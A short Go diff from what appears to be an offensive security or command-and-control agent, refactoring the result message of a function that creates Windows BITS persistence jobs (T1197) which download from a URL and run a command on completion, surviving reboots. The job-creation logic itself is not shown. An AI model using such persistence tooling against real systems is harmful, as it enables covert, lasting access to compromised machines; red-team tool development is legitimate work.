@@ -412,20 +412,16 @@ func bitsPersist(args bitsArgs) structs.CommandResult {
 		cmdLine += " " + args.CmdArgs
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] BITS Persistence Job Created (T1197)\n"+
-			"[+] Job Name:    %s\n"+
-			"[+] Job ID:      %s\n"+
-			"[+] URL:         %s\n"+
-			"[+] Local Path:  %s\n"+
-			"[+] Notify Cmd:  %s\n"+
-			"[+] Status:      Downloading (command runs on completion)\n"+
-			"\n[!] The notification command will execute when the download completes.\n"+
-			"[!] BITS jobs survive reboots and run as the creating user.\n",
-			args.Name, jobID, args.URL, args.Path, cmdLine),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("[*] BITS Persistence Job Created (T1197)\n"+
+		"[+] Job Name:    %s\n"+
+		"[+] Job ID:      %s\n"+
+		"[+] URL:         %s\n"+
+		"[+] Local Path:  %s\n"+
+		"[+] Notify Cmd:  %s\n"+
+		"[+] Status:      Downloading (command runs on completion)\n"+
+		"\n[!] The notification command will execute when the download completes.\n"+
+		"[!] BITS jobs survive reboots and run as the creating user.\n",
+		args.Name, jobID, args.URL, args.Path, cmdLine)
 }
 
 func bitsCancel(args bitsArgs) structs.CommandResult {
